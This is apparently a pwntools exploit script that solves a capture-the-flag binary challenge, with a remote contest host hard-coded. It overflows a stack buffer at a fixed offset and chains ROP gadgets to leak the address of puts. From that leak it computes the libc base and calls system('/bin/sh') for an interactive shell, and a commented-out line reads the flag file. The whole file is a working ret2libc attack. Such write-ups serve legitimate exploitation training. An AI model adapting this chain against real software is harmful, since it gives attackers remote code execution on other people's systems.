from pwn import *
from os import system

context.log_level = 'error'

exe = ELF("../file/chall")
libc = ELF("../file/libc-2.27.so")
ld = ELF("../file/ld-2.27.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.htsp.ro", 8001)

    return r


def main():    
    r = process([exe.path])

    #payload = cyclic(0x420)
    #r.sendline(payload)
    #r.sendline(b'done')
    #r.wait()

    #core = Coredump('./core')
    #offset = cyclic_find(core.fault_addr)
    r.close()
    
    offset = 1038

    '''
    plt地址可以通过如下命令查找：objdump -d ./bin
    got地址可以通过如下命令查找：objdump -R ./bin
    '''
    rop = ROP([exe, libc, ld])
    rop.raw('A' * offset)
    rop.call(exe.plt['puts'], [exe.got["puts"]])
    rop.call(rop.find_gadget(['ret']))
    rop.call(exe.symbols["main"])
    print(rop.chain())

    r = conn()
    r.recvuntil(b'/dev/null\n')
    input('continue?')
    #r.sendline(rop.chain())
    r.sendline(flat(
        b'A' * offset,
        0x4008f3, #pop_rdi; ret
        0x601018, #puts_got
        0x400600, #puts_plt
        0x4005e6, #ret
        0x400767, #main
    ))
    r.sendline(b'done')

    leaked_puts = r.recvuntil(b'\n').strip()[-6:].ljust(8, b'\x00')
    leaked_puts = u64(leaked_puts)

    libc.address = leaked_puts - libc.symbols['puts']

    print(libc.address + 0x4f420)
    print(libc.address + 0x1b3d88)

    rop = ROP([exe, libc, ld])
    rop.raw('A' * offset)
    rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])
    print(rop.chain())

    r.recvuntil(b'/dev/null\n')
    #r.sendline(rop.chain())
    r.sendline(flat(
        b'A' * offset,
        0x4008f3, #pop_rdi; ret
        libc.address + 0x1b3d88, #/bin/sh
        libc.address + 0x4f420, #system_plt
    ))
    r.sendline(b'done')
    r.interactive()
    #r.sendline(b'cat /home/ctf/flag.txt')
    #flag = r.recvlineS()
    #r.close()

    #print(flag)

if __name__ == "__main__":
    main()
